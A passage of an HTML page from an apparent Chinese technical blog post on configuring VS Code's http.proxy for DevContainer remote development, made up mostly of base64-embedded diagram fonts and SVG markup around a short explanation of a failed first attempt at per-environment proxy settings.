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)}.d2-1627946911 .text-mono-bold{font-family:'d2-1627946911-font-mono-bold'}@font-face{font-family:d2-1627946911-font-mono-bold;src:url(data:application/font-woff;base64,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)}.connection,.shape{stroke-linejoin:round}.shape{shape-rendering:geometricPrecision}.connection{stroke-linecap:round}.d2-1627946911 .fill-N1{fill:#000410}.d2-1627946911 .fill-B5{fill:#f5f6f9}.d2-1627946911 .stroke-B1{stroke:#000410}</style><defs><pattern id="dots" width="15" height="15" x="0" y="0" patternUnits="userSpaceOnUse"><path fill="#0A0F25" d="M2 2h1v1H2zM12 2h1v1h-1zM12 12h1v1h-1zM2 12h1v1H2zM2 7h1v1H2zM12 7h1v1h-1zM7 2h1v1H7zM7 12h1v1H7zM7 7h1v1H7z" opacity=".1" style="mix-blend-mode:multiply"/></pattern></defs><g id="local"><g class="shape"><path stroke="#000410" d="M20 56h592v126H20z" class="stroke-B1" style="fill:#e7e9ee;stroke-width:2"/><path d="M20 56h592v126H20z" style="fill:url(#dots);mix-blend-mode:multiply;stroke-width:2"/><path fill="transparent" stroke="#000410" d="M25 61h582v116H25z" class="stroke-B1" style="stroke-width:2"/></g><text x="316" y="43" fill="#000410" class="fill-N1" style="font-family:'d2-1627946911-font-mono';text-anchor:middle;font-size:28px">LOCAL</text></g><g id="local.proxy"><g class="shape"><path fill="#F5F6F9" stroke="#000410" d="M337 86h245v66H337z" class="stroke-B1 fill-B5" style="stroke-width:2"/></g><text x="459.5" y="124.5" fill="#000410" class="text-mono-bold fill-N1" style="text-anchor:middle;font-size:16px">HTTP://127.0.0.1:1081</text></g><g id="local.code"><g class="shape"><path fill="#F5F6F9" stroke="#000410" d="M50 86h187v66H50z" class="stroke-B1 fill-B5" style="stroke-width:2"/></g><text x="143.5" y="124.5" fill="#000410" class="text-mono-bold fill-N1" style="text-anchor:middle;font-size:16px">VS CODE (LOCAL)</text></g><g id="local.(code -&gt; proxy)[0]"><marker id="mk-3488378134" markerHeight="12" markerUnits="userSpaceOnUse" markerWidth="10" orient="auto" refX="7" refY="6" viewBox="0 0 10 12"><path stroke-width="2" d="m0 0 10 6-10 6z" class="connection" style="fill:#000410"/></marker><path fill="none" stroke="#000410" marker-end="url(#mk-3488378134)" d="M239 119h94" class="connection stroke-B1" mask="url(#d2-1627946911)" style="stroke-width:2"/></g><mask id="d2-1627946911" width="594" height="168" x="19" y="15" maskUnits="userSpaceOnUse"><path fill="#fff" d="M19 15h594v168H19z"/><path fill="rgba(0,0,0,0.75)" d="M275.5 15h81v36h-81zM359.5 108.5h200v21h-200zM72.5 108.5h142v21h-142z"/></mask></svg></svg></figure><h2 id="网络拓扑">网络拓扑</h2><p >上图描述了我目前使用 DevContainer 在远端开发时的环境，以及其与本地环境的对比。</p><ul><li><strong>本地环境</strong> 在本地正常开发时，我会在本地启动一个代理服务，地址为 <code>http://127.0.0.1:1081</code>。通过在 VS Code 中设置 <code>http.proxy</code> 为该地址，即可让 VS Code 的所有网络请求经由该代理。</li><li><strong>Remote 环境</strong> 在 Remote 使用 DevContainer 时，代理的地址变为了 <code>http://192.168.9.100:11451</code> —— 这是集群内部提供的一个代理。此时该如何应对呢？</li></ul><p >那么，在 VS Code 中能否为不同环境设置不同的代理地址呢？</p><h2 id="尝试一：为不同环境设置不同-httpproxy-值（失败）">尝试一：为不同环境设置不同 <code>http.proxy</code> 值（失败）</h2><p >VS Code 的配置是<strong>层叠式</strong>的。打开设置页可以看到如下图所示的多层作用域：<code>User</code>，<code>Remote</code> 和 <code>Workspace</code>。<code>User</code> 下的设置会对所有环境生效，<code>Remote</code> 下的设置则只对 DevContainer 生效。作用域小的设置会覆盖作用域大的设置。<code>Remote</code> 中更改的某项设置会覆盖 <code>User</code> 中的原有项，以便用户对特定环境作更精准的配置。</p><p ><img loading="lazy" src="../assets/2025-01-21-configure-http-proxy-in-devcontainer/image.png" alt=""></p><p >如此一来，一个很自然的想法便是：保持 <code>User</code> 下的 <code>http.proxy</code> 为本地的 <code>http://127.0.0.1:1081</code>，再将 <code>Remote</code> 下的设置为 <code>http://192.168.100:11451</code>，以期在不同环境下使用不同的代理。</p><p >然而这样配置并没有达到预期效果。VS Code 会把所有网络请求都发往 <code>http://192.168.100:11451</code>，而不是根据当前环境选择代理。这其中包括了 DevContainer 内部的网络请求，也包括了<strong>本地与 DevContainer 间的通信</strong>——后者显然是不合理的。</p><figure class="d2"><svg xmlns="http://www.w3.org/2000/svg" width="921" height="168" preserveAspectRatio="xMinYMin meet" viewBox="0 0 1315 239"><svg id="d2-svg" width="1315" height="239" class="d2-3235089245" viewBox="-1 35 1315 239"><rect width="1315" height="239" x="-1" y="35" stroke-width="0" rx="0" style="fill:#fff"/><style>.d2-3235089245 .text-mono{font-family:'d2-3235089245-font-mono'}@font-face{font-family:d2-3235089245-font-mono;src:url(data:application/font-woff;base64,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)}.d2-3235089245 